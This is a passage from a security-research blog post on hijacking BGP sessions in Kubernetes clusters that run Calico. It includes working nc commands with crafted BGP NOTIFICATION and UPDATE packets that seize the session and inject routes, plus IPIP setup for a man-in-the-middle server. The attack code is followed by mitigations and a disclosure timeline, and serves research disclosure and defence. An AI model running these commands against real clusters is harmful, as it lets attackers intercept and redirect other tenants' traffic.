[![](https://www.cyberark.com/wp-content/uploads/2021/05/20.png)](https://www.cyberark.com/wp-content/uploads/2021/05/20.png)

***Figure.20 – BGP OPEN message after the “Unsupported Optional Parameter” was sent***

That gives an attacker the opportunity to win the network race-condition, establish their own BGP session before the valid one and “lock” the session to themselves.

To do so, we should add this part **before** running our previous “non-persistent” commands:

```
tmpd=`mktemp -d`
tmpf="$tmpd"/fifo
mkfifo "$tmpf"
nc 192.168.198.170 179 < "$tmpf" &

#Send NOTIFICATION message – Unsupported optional parameter

# ! NOTE - The tagged parts are the BGP NOTIFICATION fields - Major Error code (\x02 -> OPEN Message Error) & Minor Error code (\x04 -> Unsupported Optional Parameter)

echo -ne '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x15\x03<#>\x02\x04</#>' > $tmpf

kill $ncpid
exec 3>&
rm -r "$tmpd"

```

[![](https://www.cyberark.com/wp-content/uploads/2021/05/21.png)](https://www.cyberark.com/wp-content/uploads/2021/05/21.png)

***Figure.21 – BGP “Unsupported Optional Parameter” NOTIFICATION message with binary data***

There’s one last change: a side-effect due to the stripping of capabilities. We also removed the “Support for Additional Paths” capability. That’s why we should change the UPDATE message format to not include the “Path ID” field.

```
# UPDATE Messages

# ! NOTE - The tagged parts are the NEXT_HOP (\xc0\xa8\xc6\xa1 -> 192.168.198.161),  and this time there's no PathID. Just the affected subnet (\x20\x08\x08\x08\x08 -> 8.8.8.8/32)

echo -ne '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x3a\x02\x00\x00\x00\x15\x40\x01\x01\x00\x40\x02\x00\x40\x03\x04<#>\xc0\xa8\xc6\xa1</#>\x40\x05\x04\x00\x00\x00\x64\x1a\xc0\xa8\x68\x00\x18\xc0\xa8\xc6<#>\x20\x08\x08\x08\x08</#>' > $tmpf

```

[![](https://www.cyberark.com/wp-content/uploads/2021/05/22.png)](https://www.cyberark.com/wp-content/uploads/2021/05/22.png)

***Figure.22 – BGP UPDATE message without NLRI Path ID fields***

[![](https://www.cyberark.com/wp-content/uploads/2021/05/23.png)](https://www.cyberark.com/wp-content/uploads/2021/05/23.png)

***Figure.23 – The full attack flow of the persistent BGP hijacking attack***

From this point on, we are the “rightful” owners of the session and can inject routings as we wish. Thus, we can redirect traffic between two pods to our MiTM server somewhere in the cloud. It is important to note that if IPIP Tunneling is used, it is necessary to set up an IPIP device on the MiTM server in order to receive the packets.

To create an IPIP device on Linux, run the following commands:

```
ip link add name ipip0 type ipip local [LOCAL_IPv4_ADDRESS] remote 0.0.0.0
ip link set ipip0 up
ip addr add [LOCAL_INTERNAL_IPv4]/[subnet mask] > dev ipip0
ip route add [REMOTE_INTERNAL_IPv4]/[subnet mask] dev ipip0

# For example -
# ip link add name ipip0 type ipip local 192.168.148.139 remote 0.0.0.0
# ip link set ipip0 up
# ip addr add 172.16.217.128/24 dev ipip0
# ip route add 172.16.28.0/24 dev ipip0

```
## Mitigation

1. First and foremost, make sure your pods are configured properly and that your node OS and third-party software are up to date. These steps will make it difficult for an attacker to gain access to your cluster nodes.

In the attack vector we introduced, it’s important to keep in mind two main points regarding the configuration of pods. The first is to make sure that the pod is not configured with HostNetwork mode, unless there is a real need for it. If there is a real need, we advise that the pod is not allowed to access the routing protocol (for example, TCP PORT 179 in BGP) to the nodes of the cluster. The second point (which we discussed in detail in [Part1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1) of this blogpost) is to DROP to the NET\_RAW capability of the pod so attackers will not be able to manipulate packets and impersonate outbound traffic from the pod.

2. Don’t rely on the default configuration of the network plugin. Make changes to the product configuration. In the case of BGP routing daemon, it is worth implementing a configurable solution such as TCP-MD5 that prevents simple hijacking attacks.

Tigera released a fix for this attack vector in v3.16.3 of the Calico open-source project that allows users to configure a password to authenticate the BGP peers (Calico Enterprise already had this option).

3. In [Part1 of this blog post](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1), we mentioned the dangers that exist in spoofing IP addresses by attackers from within pods. One of the dangers is that an attacker can spoof the IP address of the host, giving them the opportunity to initiate a TCP 3-way handshake that might cause a BGP DoS, as we described earlier in this blog post. To block this, it is necessary to drop NET\_RAW capability from the pod settings (there is a detailed explanation of this in Part 1). Calico also has an out-of-the-box policy that should mitigate this risk.

## sum += 1337

The use of routing daemons on Kubernetes clusters is opening some new threat models against known routing protocols’ security limitations. An attacker can exploit these new game rules to manipulate data traffic throughout the cluster from low-privileged access to a single node in the cluster.

We hope that introducing the various features of Kubernetes routing daemons, the attack vector examples and mitigation recommendations will help you understand how an attacker can utilize the routing infrastructure to gain a particularly strong grip on the cluster — and how you can stop it.

We also encourage you to examine the network plugins products in depth to determine if they provide adequate protection. We recommend that you do not settle for out-of-the-box capabilities and make the necessary adjustments and configurations to improve security.

In the first part of this blog series, we dove deep into the network of Kubernetes. Now, at the conclusion of this series, it is important for us to mention that technology is always advancing, as well as the attacker’s techniques and tactics. We are now witnessing a significant increase in the use of eBPF technology to implement network policies in containerized environments. It’s only a matter of time before attackers also find ways to exploit this to their advantage. We, together with you, will try to do it better and faster to identify advanced techniques that help block and prevent such attacks in the future.

**Disclosure Timeline – RFC 4724**

**June 23, 2020 –** RFC 4724 security issue reported to IETF (Internet Engineering Task Force)

**June 25, 2020 –** IETF acknowledged the security issue and suggested to issue an RFC errata

**June 29, 2020 –** CyberArk Labs issued an errata for RFC4724, “Graceful Restart Mechanism for BGP”

**July 21, 2020 –** The errata accepted as a “Held for Document Update” status

***CyberArk Labs would like to thank the IETF for their great help and patience in the coordination process.***

**Disclosure Timeline – Tigera**

**June 15, 2020 –** Vulnerability reported to Tigera by CyberArk Labs

**June 17, 2020 –** In Tigera’s initial response they asked for more clarifications

**July 14, 2020 –** Tigera reproduced the vulnerability and acknowledged it.

**Oct. 14, 2020** – Tigera issued a fix in Calico v3.16.3 which allows the user to add a BGP password to their BGP Peers

**Oct. 15, 2020 –** CyberArk Labs asked Tigera about issuing a CVE

**Oct. 16, 2020** – Tigera responded that they don’t plan to issue a CVE as they deem this is a flaw in the BGP protocol behavior.

**Oct.19 – Nov.4, 2020** – Continued communication in which we ended up disagreeing about the nature of the vulnerability

**Nov 4, 2020** – CyberArk Labs issued a CVE request to MITRE as a root CNA

**Dec. 19, 2020** – MITRE updated they’ll reach out to Tigera

**Dec. 28, 2020** – MITRE updated that Tigera deemed the vulnerability lies within the BIRD routing daemon component

**Dec. 28, 2020** – CyberArk Labs responded to MITRE pointing out that we believe that the issue is caused by Tigera’s design, not allowing Calico Project users to secure their BGP sessions (noting that the separate BIRD daemon component does allows it)

**Feb. 15, 2021** – MITRE issued the Disputed CVE-2021-26928

***CyberArk Labs would like to thank the MITRE CVE Assignment Team for their great help and patience in the coordination process.***

###### Previous Article

![Best Defense? Our Red Team Lead Reveals 4 MFA Bypass Techniques](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2021%2F06%2FMFA-Bypass-Techniques.png&size=1&version=1719540223&sig=f11bfdcafab6ac18e529fbc88cbe397f&default=hubs%2Ftilebg-blogs.jpg) Best Defense? Our Red Team Lead Reveals 4 MFA Bypass Techniques

Digital transformation, widespread remote work due to the COVID-19 pandemic and ever-increasing reliance on...

###### Next Article

![Virtual Cloak: Virtualization as Malware](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2021%2F05%2FFigure1b.jpg&size=1&version=1719540223&sig=20bd3cf554ae1a6621b50bab6035fa83&default=hubs%2Ftilebg-blogs.jpg) Virtual Cloak: Virtualization as Malware

Virtualization is a double-edged sword The glorious rise of the cloud in recent years could be attributed t...

## Recommended for You

* [‹](#related-items-carousel)
* [›](#related-items-carousel)

![Teach Yourself Kubiscan in 7 Minutes (or Less…)](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2024%2F11%2Fyourself-kubiscan.png&size=1&version=1736519860&sig=7490374a6eefa22c2472a6d314275601&default=hubs%2Ftilebg-blogs.jpg)
 Teach Yourself Kubiscan in 7 Minutes (or Less…)
#### xml encoding="UTF-8" While Kubernetes’ Role-based access control (RBAC) authorization model is an essential part of securing Kubernetes, managing it has proven to be a significant challenge — especially when dealing...

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/teach-yourself-kubiscan-in-7-minutes-or-less)

![ByteCodeLLM – Privacy in the LLM Era: Byte Code to Source Code](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2024%2F12%2Fbytecodellm-header.png&size=1&version=1733852097&sig=7a94fac5eea6b69c47c905170d418404&default=hubs%2Ftilebg-blogs.jpg)
 ByteCodeLLM – Privacy in the LLM Era: Byte Code to Source Code
#### xml encoding="UTF-8" TL;DR ByteCodeLLM is a new open-source tool that harnesses the power of Local Large Language Models (LLMs) to decompile Python executables. Furthermore, and importantly, it prioritizes data...

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/bytecodellm-privacy-in-the-llm-era-byte-code-to-source-code)

![White FAANG: Devouring Your  Personal Data](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2024%2F11%2Fdevouring-your-personal-data-1.png&size=1&version=1733851635&sig=dd11af86eaab892184b50b5ffb0929fa&default=hubs%2Ftilebg-blogs.jpg)
 White FAANG: Devouring Your Personal Data
#### xml encoding="UTF-8" Generated using Ideogram Abstract Privacy is a core aspect of our lives. We have the fundamental right to control our personal data, physically or virtually. However, as we use products from...

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/white-faang-devouring-your-personal-data)

![Discovering Hidden Vulnerabilities in Portainer with CodeQL](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2024%2F10%2Fhidden-vulnerabilities-codeql.png&size=1&version=1733232225&sig=2b2b66eae20598689f0b4c2961bf71b3&default=hubs%2Ftilebg-blogs.jpg)
 Discovering Hidden Vulnerabilities in Portainer with CodeQL
#### xml encoding="UTF-8" Recently, we researched a project on Portainer, the go-to open-source tool for managing Kubernetes and Docker environments. With more than 30K stars on GitHub, Portainer gives you a user-friendly...

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/discovering-hidden-vulnerabilities-in-portainer-with-codeql)

![Anatomy of an LLM RCE](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2024%2F10%2Fanatomy.jpg&size=1&version=1730382959&sig=4b5c8adffa0777391a3f5280e28289cd&default=hubs%2Ftilebg-blogs.jpg)
 Anatomy of an LLM RCE
#### xml encoding="UTF-8" As large language models (LLMs) become more advanced and are granted additional capabilities by developers, security risks increase dramatically. Manipulated LLMs are no longer just a risk of...

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce)

![A Security Analysis of Azure DevOps Job Execution](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2024%2F08%2Fsecurity-analysis-of-azure.jpg&size=1&version=1730122829&sig=4f757bcf6ac60071ab372bb9e7c35fab&default=hubs%2Ftilebg-blogs.jpg)
 A Security Analysis of Azure DevOps Job Execution
#### xml encoding="UTF-8" In software development, CI/CD practices are now standard, helping to move code quickly and efficiently from development to production. Azure DevOps, previously known as Team Foundation Server...

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/a-security-analysis-of-azure-devops-job-execution)

![AI Treason: The Enemy Within](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2024%2F08%2Fai-treason.png&size=1&version=1724832176&sig=854985ddfaae3088b2e719f656c503dd&default=hubs%2Ftilebg-blogs.jpg)
 AI Treason: The Enemy Within
#### xml encoding="UTF-8" tl;dr: Large language models (LLMs) are highly susceptible to manipulation, and, as such, they must be treated as potential attackers in the system. LLMs have become extremely popular and serve...

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/ai-treason-the-enemy-within)

![A Brief History of Game Cheating](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2024%2F07%2Fbrief-history.jpg&size=1&version=1724832176&sig=ed4175d6fc08019d967e03d8edae399a&default=hubs%2Ftilebg-blogs.jpg)
 A Brief History of Game Cheating
#### xml encoding="UTF-8" Over the short span of video game cheating, both cheaters and game developers have evolved in many ways; this includes everything from modification of important game variables (like health) by...

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/a-brief-history-of-game-cheating)

![Double Dipping Cheat Developer Gets Caught Red-Handed](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2024%2F07%2Fdouble-dipping-hero.jpg&size=1&version=1721914638&sig=3cdd00ffc171c6df7bbb7f6a3f9e756f&default=hubs%2Ftilebg-blogs.jpg)
 Double Dipping Cheat Developer Gets Caught Red-Handed
#### xml encoding="UTF-8" Following our post “A Brief History of Game Cheating,” it’s safe to say that cheats, no matter how lucrative or premium they might look, always carry a degree of danger. Today’s story revolves...

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/double-dipping-cheat-developer-gets-caught-red-handed)

![Identity Crisis: The Curious Case of a Delinea Local Privilege Escalation Vulnerability](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2024%2F07%2Flocal-privilege-escalation-vulnerability.png&size=1&version=1723021942&sig=4fae45bfb4adf70489250e22793e701c&default=hubs%2Ftilebg-blogs.jpg)
 Identity Crisis: The Curious Case of a Delinea Local Privilege Escalation Vulnerability
#### xml encoding="UTF-8" During a recent customer engagement, the CyberArk Red Team discovered and exploited an Elevation of Privilege (EoP) vulnerability (CVE-2024-39708) in Delinea Privilege Manager (formerly Thycotic...

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/identity-crisis-the-curious-case-of-a-delinea-local-privilege-escalation-vulnerability)

![How to Bypass Golang SSL Verification](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2024%2F07%2Fbypass-golang.jpg&size=1&version=1723019318&sig=5a3e1e48bbdb35e5985dfd5119f8eb85&default=hubs%2Ftilebg-blogs.jpg)
 How to Bypass Golang SSL Verification
#### xml encoding="UTF-8" Golang applications that use HTTPS requests have a built-in SSL verification feature enabled by default. In our work, we often encounter an application that uses Golang HTTPS requests, and we have...

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/how-to-bypass-golang-ssl-verification)

![The Current State of Browser Cookies](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2024%2F07%2Fcurrentstate-ofobrowser-cookies.jpg&size=1&version=1724348512&sig=7e1b942a6fca792d513a415d1c7569e2&default=hubs%2Ftilebg-blogs.jpg)
 The Current State of Browser Cookies
#### xml encoding="UTF-8" What Are Cookies When you hear “cookies,” you may initially think of the delicious chocolate chip ones. However, web cookies function quite differently than their crumbly-baked counterparts....

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/the-current-state-of-browser-cookies)

![You Can’t Always Win Racing the (Key)cloak](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2024%2F06%2Fkeycloak-blog-hero.jpg&size=1&version=1720633182&sig=446bfb24fb8e212122fde96e0d8b7af6&default=hubs%2Ftilebg-blogs.jpg)
 You Can’t Always Win Racing the (Key)cloak
#### xml encoding="UTF-8" Web Race Conditions – Success and Failure – a Keycloak Case Study In today’s connected world, many organizations’ “keys to the kingdom” are held in identity and access management (IAM) solutions;...

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/you-cant-always-win-racing-the-keycloak)

![Operation Grandma: A Tale of LLM Chatbot Vulnerability](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2024%2F05%2Fcreepy-bed.png&size=1&version=1719845022&sig=6530dded9453b2f389f8885cf04d80a0&default=hubs%2Ftilebg-blogs.jpg)
 Operation Grandma: A Tale of LLM Chatbot Vulnerability
#### xml encoding="UTF-8" Who doesn’t like a good bedtime story from Grandma? In today’s landscape, more and more organizations are turning to intelligent chatbots or large language models (LLMs) to boost service quality...

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/operation-grandma-a-tale-of-llm-chatbot-vulnerability)

![Your NVMe Had Been Syz’ed: Fuzzing NVMe-oF/TCP Driver for Linux with Syzkaller](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2024%2F04%2Flinux-with-syzkaller.png&size=1&version=1723019440&sig=fc031b634965a4a77cea69f70ff2c5f4&default=hubs%2Ftilebg-blogs.jpg)
 Your NVMe Had Been Syz’ed: Fuzzing NVMe-oF/TCP Driver for Linux with Syzkaller
#### xml encoding="UTF-8" Following research conducted by a colleague of mine [1] at CyberArk Labs, I better understood NVMe-oF/TCP. This kernel subsystem exposes INET socket(s), which can be a fruitful attack surface for...

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/your-nvme-had-been-syzed-fuzzing-nvme-of-tcp-driver-for-linux-with-syzkaller)

![Crumbled Security: Unmasking the Cookie-Stealing Malware Threat](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2024%2F03%2Fhero-labs-crumbled-security.jpg&size=1&version=1719543178&sig=eab423d3606b6a46f247e40b15bc3bc0&default=hubs%2Ftilebg-blogs.jpg)
 Crumbled Security: Unmasking the Cookie-Stealing Malware Threat
#### xml encoding="UTF-8" Over the past few years, we’ve seen a huge increase in the adoption of identity security  solutions. Since these types of solutions help protect against a whole range of password-guessing and...

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/crumbled-security-unmasking-the-cookie-stealing-malware-threat)

![The Hacker’s Guide to The Cosmos (SDK): Stealing Millions from the Blockchain](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2024%2F02%2Fcosmos-millions-from-the-blockchain.png&size=1&version=1718922360&sig=f935bb8b13cf3c88fd05cea3350b8e96&default=hubs%2Ftilebg-blogs.jpg)
 The Hacker’s Guide to The Cosmos (SDK): Stealing Millions from the Blockchain
#### xml encoding="UTF-8" Introduction Welcome, fellow travelers of the Cosmos! While we may not be traversing the stars on a spaceship, we are all interconnected through the powerful network of blockchains. Unfortunately,...

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/the-hackers-guide-to-the-cosmos-sdk-stealing-millions-from-the-blockchain)

![A Deep Dive into Penetration Testing of macOS Applications (Part 3)](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2023%2F07%2Fdeep-dive-into-penetration-testing.jpg&size=1&version=1719516434&sig=570c075b3b5f08e0cf019cb834b95c03&default=hubs%2Ftilebg-blogs.jpg)
 A Deep Dive into Penetration Testing of macOS Applications (Part 3)
#### xml encoding="UTF-8" Introduction This is the final installment of the blog series “A Deep Dive into Penetration Testing of macOS Applications.” Previously, we discussed the structure of macOS applications and their...

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/a-deep-dive-into-penetration-testing-of-macos-applications-part-3)

![Ransomware’s PLAYing a Broken Game](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2024%2F01%2Fransomware-playing-a-broken-game.png&size=1&version=1724348911&sig=fe7d371eff9e4e05df01e80c10b6fe45&default=hubs%2Ftilebg-blogs.jpg)
 Ransomware’s PLAYing a Broken Game
#### xml encoding="UTF-8" Abstract The Play ransomware group is one of the most successful ransomware syndicates today. All it takes is a quick peek with a disassembler to know why this group has become infamous. This is...

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/ransomwares-playing-a-broken-game)

![SafeNet: Securing Your Network From Yourself](https://content.cdntwrk.com/mediaproxy?url=https%3A%2F%2Fwww.cyberark.com%2Fwp-content%2Fuploads%2F2023%2F12%2Fsafenet-banner.jpg&size=1&version=1718922360&sig=35b3e26671c9eb0ae5c3789bac60eac1&default=hubs%2Ftilebg-blogs.jpg)
 SafeNet: Securing Your Network From Yourself
#### xml encoding="UTF-8" TL;DR Whether working at home or in the office, when conducting cybersecurity research, investigating the dark web forums or engaging with any dangerous part of the internet, staying safe is...

[Read Blog](https://www.cyberark.com/resources/threat-research-blog/safenet-securing-your-network-from-yourself)

[Return to Home](https://www.cyberark.com/resources)

© CyberArk Software Inc

×
Streams

* Products & Services
  + [Cloud Security](https://www.cyberark.com/resources/cloud-security)
  + [Customer Access](https://www.cyberark.com/resources/customer-access)
  + [Endpoint Privilege Security](https://www.cyberark.com/resources/endpoint-privilege-security)
  + [Identity Management](https://www.cyberark.com/resources/identity-management)
  + [Privileged Access Management](https://www.cyberark.com/resources/privileged-access-management)
  + [Secrets Management](https://www.cyberark.com/resources/secrets-management)
  + [Services & Support​](https://www.cyberark.com/resources/services-support)
  + [Shared Services](https://www.cyberark.com/resources/shared-services)
  + [Workforce Access](https://www.cyberark.com/resources/workforce-access)
* Topics
  + [Access Management](https://www.cyberark.com/resources/access-management)
  + [Best Practices](https://www.cyberark.com/resources/best-practices)
  + [DevSecOps](https://www.cyberark.com/resources/devsecops)
  + [Endpoint Security](https://www.cyberark.com/resources/endpoint-security)
  + [Hybrid and Multi-Cloud Security](https://www.cyberark.com/resources/hybrid-and-multi-cloud-security)
  + [Identity Security](https://www.cyberark.com/resources/identity-security)
  + [IT Security Audit and Compliance](https://www.cyberark.com/resources/it-security-audit-and-compliance)
  + [Least Privilege](https://www.cyberark.com/resources/least-privilege)
  + [Partners](https://www.cyberark.com/resources/partners)
  + [Ransomware Protection](https://www.cyberark.com/resources/ransomware-protection)
  + [Remote Access](https://www.cyberark.com/resources/remote-access)
  + [Robotic Process Automation](https://www.cyberark.com/resources/robotic-process-automation)
  + [Threat Research​](https://www.cyberark.com/resources/threat-research)
  + [Zero Trust](https://www.cyberark.com/resources/zero-trust)
* Industry
  + [Federal](https://www.cyberark.com/resources/federal)
  + [Financial Services](https://www.cyberark.com/resources/financial-services)
  + [Healthcare​](https://www.cyberark.com/resources/healthcare)
  + [Higher Education](https://www.cyberark.com/resources/higher-education)
  + [Insurance](https://www.cyberark.com/resources/insurance)
  + [Manufacturing](https://www.cyberark.com/resources/manufacturing)
* Content Type
  + [Analyst Reports](https://www.cyberark.com/resources/analyst-reports)
  + [Blog Articles](https://www.cyberark.com/resources/all-blog-posts)
  + [Customer Stories](https://www.cyberark.com/customer-stories/)
  + [eBooks​](https://www.cyberark.com/resources/ebooks)
  + [Executive Insights](https://www.cyberark.com/resources/executive-insights)
  + [Infographics​](https://www.cyberark.com/resources/infographics)
  + [Podcasts](https://www.cyberark.com/podcasts/)
  + [Product Announcements](https://www.cyberark.com/resources/product-announcements)
  + [Product Datasheets​](https://www.cyberark.com/resources/product-datasheets)
  + [Solution Briefs​](https://www.cyberark.com/resources/solution-briefs)
  + [Tools & Blueprints](https://www.cyberark.com/resources/tools-blueprints)
  + [Webinars](https://www.cyberark.com/resources/webinars)
  + [Videos](https://www.cyberark.com/resources/videos)
  + [Whitepapers​](https://www.cyberark.com/resources/white-papers)

![loading](https://content.cdntwrk.com/img/hubs/ajax-loader-white-2x.gif?v=19a554b579c4)

* Share this Hub
* [Facebook](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.cyberark.com%2Fresources)
* [Twitter](https://twitter.com/share?text=Check%20out%20what%27s%20happening%20at%20CyberArk%21&url=https%3A%2F%2Fwww.cyberark.com%2Fresources&via=CyberArk)
* [Email](/cdn-cgi/l/email-protection#19266a6c7b737c7a6d245c777e75706a713c2b293c5c2b3c21293c202a3c2b295a607b7c6b586b723c2b294a767f6d6e786b7c3c2b2950777a3c2b2e6a3c2b29516c7b3c2b2971786a3c2b297b7c7c773c2b296a71786b7c7d3c2b296e706d713c2b2960766c3f787469227b767d60245a717c7a723c2b29766c6d3c2b296e71786d3c2b2e6a3c2b29717869697c7770777e3c2b29786d3c2b295a607b7c6b586b723c2b283c29583c2958716d6d696a3c2a583c2b5f3c2b5f6e6e6e377a607b7c6b786b72377a76743c2b5f6b7c6a766c6b7a7c6a)
* [LinkedIn](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.cyberark.com%2Fresources&title=English%20%E2%80%93%20CyberArk%20Software%20Inc%27s&summary=Check%20out%20what%27s%20happening%20at%20CyberArk%21)

×

* #### STAY IN TOUCH

  Keep up to date on security best practices, events and webinars.

  [Tell Me How](https://lp.cyberark.com/Stay-in-touch.html)

* Support
* [Contact Support](https://www.cyberark.com/services-support/technical-support-contact/)
* [Training & Certification](https://www.cyberark.com/services-support/training/)
* [Technical Support](https://www.cyberark.com/services-support/technical-support/)
* [EPM SaaS Register / Login](https://www.cyberark.com/products/endpoint-privilege-manager/login/)
* [Product Security](https://www.cyberark.com/product-security/)

* Resources
* [Resource Center](https://www.cyberark.com/resources)
* [Events](https://www.cyberark.com/events/)
* [Blogs](https://www.cyberark.com/resources/all-blog-posts)
* [CIO Connection](https://www.cyberark.com/cio-connection/)
* [CyberArk Blueprint](https://www.cyberark.com/blueprint/)
* [Scan Your Network](https://www.cyberark.com/discovery-audit/)
* [Marketplace![external icon](https://www.cyberark.com/wp-content/uploads/2021/01/External-darkblue.svg)](https://community.cyberark.com/marketplace/s/)

* Partners
* [Partner Network](https://www.cyberark.com/partners/partner-network/)
* [Partner Community![external link](https://www.cyberark.com/wp-content/uploads/2021/01/External-darkblue.svg)](https://community.cyberark.com/partners/s/login/)
* [Partner Finder](https://www.cyberark.com/partner-finder/)
* [Become a Partner](https://www.cyberark.com/partners/become-a-partner/)
* [Alliance Partner](https://www.cyberark.com/partners/alliance-partners/)

* Company
* [Investor Relations ![external link](https://www.cyberark.com/wp-content/uploads/2021/01/External-darkblue.svg)](https://investors.cyberark.com/home/default.aspx)
* [Leadership](https://www.cyberark.com/company/leadership/)
* [Board of Directors](https://www.cyberark.com/company/leadership/#directors)
* [Newsroom](https://www.cyberark.com/company/newsroom/)
* [Office Locations](https://www.cyberark.com/company/office-locations/)
* [Environmental, Social and Governance](https://www.cyberark.com/company/esg/)
* [Trust Center](https://www.cyberark.com/trust/)
* [Careers – We’re Hiring!](https://careers.cyberark.com/)

![CyberArk Logo](https://cihost.uberflip.com/cyberArk/favicon-update/assets/cyberark-logo.svg)

Copyright ©  CyberArk Software Ltd.
All rights reserved.

* [*Linkedin*](https://www.linkedin.com/company/cyber-ark-software)
* [*Blog*](https://www.cyberark.com/resources/blog)
* [*Youtube*](https://www.youtube.com/user/cyberarksoftware)

* [Terms and Conditions](https://www.cyberark.com/terms-conditions/)
* [Privacy Policy](https://www.cyberark.com/privacy-notice/)

